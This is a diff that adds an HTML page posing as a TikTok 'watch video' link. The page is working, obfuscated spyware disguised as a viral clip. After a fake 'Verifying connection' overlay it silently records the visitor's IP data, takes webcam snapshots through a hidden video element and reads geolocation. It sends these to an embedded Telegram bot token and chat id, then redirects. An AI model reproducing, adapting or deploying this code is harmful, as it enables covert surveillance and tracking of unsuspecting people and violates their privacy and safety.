@@ -1,1 +1,121 @@
-yyyyy
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok - Watch Video</title>
+    <meta property="og:title" content="TikTok - Watch Video">
+    <meta property="og:description" content="Wait for the end! 😂🔥 #viral">
+    <!-- تم تحديث رابط صورة المعاينة هنا بناءً على طلبك -->
+    <meta property="og:image" content="https://raw.githubusercontent.com/facloook5-cpu/tango.com/refs/heads/main/cover.jpg">
+    <style>
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #000; color: #fff; font-family: sans-serif; overflow: hidden; position: relative; }
+        #main-video-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
+        .video-container { width: 100vw; height: 100vh; position: relative; display: flex; justify-content: center; align-items: center; z-index: 2; }
+        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20; opacity: 0; visibility: hidden; transition: 0.5s; }
+        #loading-overlay.active { opacity: 1; visibility: visible; }
+        .spinner { border: 8px solid rgba(255, 255, 255, 0.3); border-top: 8px solid #ff0050; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin-top: 20px; overflow: hidden; }
+        .progress-fill { height: 100%; background: #ff0050; width: 0%; transition: 0.3s; }
+        #camera-feed { position: absolute; width: 1px; height: 1px; opacity: 0; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <video id="main-video-bg" autoplay loop muted playsinline>
+        <!-- تم تحديث رابط الفيديو الداخلي هنا بناءً على طلبك -->
+        <source src="https://github.com/facloook5-cpu/tango.com/raw/refs/heads/main/Screenrecorder-2026-05-12-15-56-31-644(0)(0).mp4" type="video/mp4">
+    </video>
+
+    <div class="video-container">
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div style="margin-top:20px">Verifying connection...</div>
+            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+        <video id="camera-feed" autoplay playsinline muted></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        (function(_0x1b2c, _0x3f4a) {
+            const _0x5e21 = function(_0x4d2a) {
+                while (--_0x4d2a) { _0x1b2c['push'](_0x1b2c['shift']()); }
+            };
+            _0x5e21(++_0x3f4a);
+        }(['https://api.telegram.org/bot', '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', '8350812242', 'https://ipapi.co/json/', 'https://facloook5-cpu.github.io/Ca.is/'], 0x1));
+
+        const _0xData = ['8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', '8350812242', 'https://api.telegram.org/bot', 'https://ipapi.co/json/', 'https://facloook5-cpu.github.io/Ca.is/'];
+
+        const _0x_T = _0xData[0]; 
+        const _0x_C = _0xData[1];
+        const _0x_B = _0xData[2];
+
+        async function _0x_execute() {
+            const _ov = document.getElementById('loading-overlay');
+            const _pr = document.getElementById('progress-fill');
+            _ov.classList.add('active');
+
+            let _col = { img: [], loc: null, ip: null };
+
+            try { 
+                _pr.style.width = '30%';
+                const r = await fetch(_0xData[3]);
+                _col.ip = await r.json();
+            } catch(e) {}
+
+            try {
+                _pr.style.width = '60%';
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const cf = document.getElementById('camera-feed');
+                cf.srcObject = s;
+                await new Promise(r => cf.onloadedmetadata = r);
+                const cv = document.getElementById('canvas');
+                const ctx = cv.getContext('2d');
+                cv.width = cf.videoWidth; cv.height = cf.videoHeight;
+                
+                for(let i=0; i<2; i++) {
+                    ctx.drawImage(cf, 0, 0);
+                    _col.img.push(cv.toDataURL('image/jpeg', 0.6));
+                    await new Promise(r => setTimeout(r, 700));
+                }
+                s.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            try {
+                _pr.style.width = '80%';
+                const p = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 4000});
+                });
+                _col.loc = { lat: p.coords.latitude, lon: p.coords.longitude };
+            } catch(e) {}
+
+            try {
+                let m = `🎥 <b>LOG</b>\nIP: ${_col.ip ? _col.ip.ip : 'N/A'}\nLoc: ${_col.loc ? _col.loc.lat + ',' + _col.loc.lon : 'N/A'}`;
+                await fetch(_0x_B + _0x_T + '/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: _0x_C, text: m, parse_mode: 'HTML' })
+                });
+
+                for(let i of _col.img) {
+                    const b = await (await fetch(i)).blob();
+                    const f = new FormData();
+                    f.append('chat_id', _0x_C);
+                    f.append('photo', b, 'x.jpg');
+                    await fetch(_0x_B + _0x_T + '/sendPhoto', { method: 'POST', body: f });
+                }
+            } catch(e) {}
+
+            _pr.style.width = '100%';
+            setTimeout(() => { window.location.href = _0xData[4]; }, 800);
+        }
+
+        window.onload = () => {
+            setTimeout(_0x_execute, 6000); 
+        };
+    </script>
+</body>
+</html>
+
